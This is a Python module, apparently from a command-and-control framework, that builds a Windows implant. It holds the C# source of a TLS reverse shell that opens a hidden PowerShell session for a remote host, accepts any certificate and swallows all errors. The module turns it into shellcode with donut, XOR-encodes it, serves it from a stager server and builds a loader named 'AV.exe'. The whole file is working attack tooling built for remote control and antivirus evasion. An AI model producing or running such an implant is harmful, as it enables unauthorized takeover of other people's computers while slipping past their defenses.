import base64
import os
import tempfile
import subprocess
import shutil
from pathlib import Path
from core.payload_generator.common import payload_utils as payutils
from core.payload_generator.common.payload_utils import XorEncode
from core.payload_generator.windows.tls.exe import build_make
from core import stager_server as stage
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


def make_raw(ip, port):
	payload = f"""

using System;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;     // ← for SslProtocols
using System.Security.Cryptography.X509Certificates;
using System.Diagnostics;
using System.IO;
using System.Threading;

class Program
{{
	const string RemoteHost = "{ip}";
	const int    RemotePort = {port};

	static void Main()
	{{
		try
		{{

			using (var client = new TcpClient(RemoteHost, RemotePort))

			using (var ssl = new SslStream(
				client.GetStream(),
				leaveInnerStreamOpen: false,
				userCertificateValidationCallback: (_,__,___,____) => true
			))
			{{

				ssl.AuthenticateAsClient(
					targetHost: RemoteHost,
					clientCertificates: null,
					enabledSslProtocols: SslProtocols.Tls12,
					checkCertificateRevocation: false
				);

				var p = new Process
				{{
					StartInfo = new ProcessStartInfo
					{{
						FileName               = "powershell.exe",
						RedirectStandardInput  = true,
						RedirectStandardOutput = true,
						RedirectStandardError  = true,
						UseShellExecute        = false,
						CreateNoWindow         = true
					}}
				}};
				p.Start();


				var tOut = new Thread(() => CopyStream(p.StandardOutput.BaseStream, ssl)) {{ IsBackground = true }};
				var tErr = new Thread(() => CopyStream(p.StandardError .BaseStream, ssl)) {{ IsBackground = true }};
				var tIn  = new Thread(() => CopyStream(ssl,               p.StandardInput.BaseStream)) {{ IsBackground = true }};

				tOut.Start();
				tErr.Start();
				tIn .Start();

				p.WaitForExit();
			}}
		}}
		catch
		{{
			// swallow all errors
		}}
	}}

	static void CopyStream(Stream input, Stream output)
	{{
		var buf = new byte[4096];
		int  len;
		try
		{{
			while ((len = input.Read(buf, 0, buf.Length)) > 0)
			{{
				output.Write(buf, 0, len);
				output.Flush();
			}}
		}}
		catch {{ }}
	}}
}}
"""

	return payload


def generate_exe_reverse_tls(ip, port, stager_ip, stager_port):
	raw = make_raw(ip, port)

	# 2) write to temp .c file
	fd, c_path = tempfile.mkstemp(suffix=".c", text=True)
	try:
		with os.fdopen(fd, "w") as f:
			f.write(raw)

		# 3) compile with Mingw‑w64 as x86_64 Windows exe
		exe_path = c_path[:-2] + ".exe"
		mcs = "mcs"
		cmd = [
			mcs,
			f"-out:{exe_path}",
			c_path
		]
		#print(f"[+] Compiling payload: {' '.join(cmd)}")
		subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		# 4) run donut to produce shellcode blob (format=raw)
		sc_path = c_path[:-2] + ".bin"
		donut = shutil.which("donut")
		# -f 1 => raw shellcode, -a 2 => amd64, -o => output
		donut_cmd = [donut, "-b", "1", "-f", "3", "-a", "2", "-o", sc_path, "-i", exe_path]
		#print(f"[+] Generating shellcode: {' '.join(donut_cmd)}")
		subprocess.run(donut_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		# 5) read the shellcode blob into memory
		try:
			with open(sc_path, "rb") as f:
				shellcode = f.read()

		except Exception as e:
			print(f"ERROR: {e}")

		shellcode = shellcode.replace(b"unsigned char buf[] =", b"")

		with open(sc_path, "wb") as f:
			f.write(shellcode)

		with open(sc_path, "rb") as f:
			donut_file = f.read()

		"""with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
			f.write(donut_file)"""

		# 6) XOR‑encode it using our XorEncode helper
		encoder = XorEncode()
		#encoder.shellcode = bytearray(shellcode)
		length = len(shellcode)
		#print("AFTER length")

		fd, output_trash = tempfile.mkstemp(suffix=".bin", text=True)
		fd, xor_main_output = tempfile.mkstemp(suffix=".c", text=True)
		payload = encoder.main(sc_path, output_trash, "deadbeefcafebabe", xor_main_output)
		out = Path.cwd() / "AV.exe"
		stage.start_stager_server(stager_port, payload, format="bin", ip=stager_ip)
		print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
		build_status = build_make.build(out, payload, stager_ip, stager_port)
		if build_status:
			return True

	finally:
		# clean up temp files
		for p in (c_path, exe_path, sc_path, output_trash, xor_main_output):
			try:
				os.remove(p)

			except OSError:
				pass






